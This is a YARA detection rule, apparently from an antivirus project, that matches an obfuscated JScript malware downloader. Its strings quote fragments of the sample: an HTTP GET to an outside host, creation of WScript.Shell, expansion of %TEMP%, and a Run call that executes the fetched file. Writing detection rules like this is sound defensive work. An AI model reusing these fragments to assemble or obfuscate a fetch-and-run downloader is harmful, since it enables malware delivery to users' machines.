rule sig_20160427_5da2e91d9a24a25b8ca21234302e36f9 {
  meta:
    description = "datamaliciousorder - file 20160427_5da2e91d9a24a25b8ca21234302e36f9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f23765873ef6603f79a279ca213f82adf37fb4b1d9eb5b4805d6766be9c94a87"

  strings:
    $s1  = "TfstrUnjjq[MuwkcTprqe](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s2  = "function CpuzwLpqpu() {return BjnkrAkzud[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tHeGNQR" ascii
    $s3  = "function CpuzwLpqpu() {return BjnkrAkzud[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tHeGNQR" ascii
    $s4  = "var BjnkrAkzud = function ZmqdnZhtrj() {return VcveqBgtzg[AkltzBadxj](\"WScript\"+\".Shell\");}(), SzfqxBljxz = 11;" fullword ascii
    $s5  = "function HfwmrWpfet(UiwupNfejs, SkvpvEcgyy){KrqghSyhdi = KrqghSyhdi * 1; return UiwupNfejs - SkvpvEcgyy;};" fullword ascii
    $s6  = "if (TfstrUnjjq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "var VcveqBgtzg = this[\"WScript\"];" fullword ascii
    $s8  = "function CzmveAkibl(){return VdxhiLzmbe + \"\";};" fullword ascii
    $s9  = "function UmivjWitff() {return ((SkatcNhdxq == true) && (SkatcNhdxq == VkrheHbciw)) ? 1 : KrqghSyhdi;};" fullword ascii
    $s10 = "var VkrheHbciw = false;" fullword ascii
    $s11 = "function GnopyWuadl()" fullword ascii
    $s12 = "EspesJqhwy = true;" fullword ascii
    $s13 = "var IrkywNijdt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function WebkiZzbak(){return AkltzBadxj;};" fullword ascii
    $s15 = "}while (OhqjvWjmzi);" fullword ascii
    $s16 = "function YbodpNosdu(UwjxvHnjlh) {var HgqumGathd = (1, 2, 3, 4, 5, UwjxvHnjlh); return HgqumGathd;};" fullword ascii
    $s17 = "function CyiwlQhcte(){return 23;};" fullword ascii
    $s18 = "return HfwmrWpfet(XhmanZyavn, CerujRjsxe);" fullword ascii
    $s19 = "var EspesJqhwy = false;" fullword ascii
    $s20 = "function PtzwjJbsyv(LdsugUkpho){BjnkrAkzud[\"R\"+\"un\"](LdsugUkpho, KrqghSyhdi, KrqghSyhdi);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}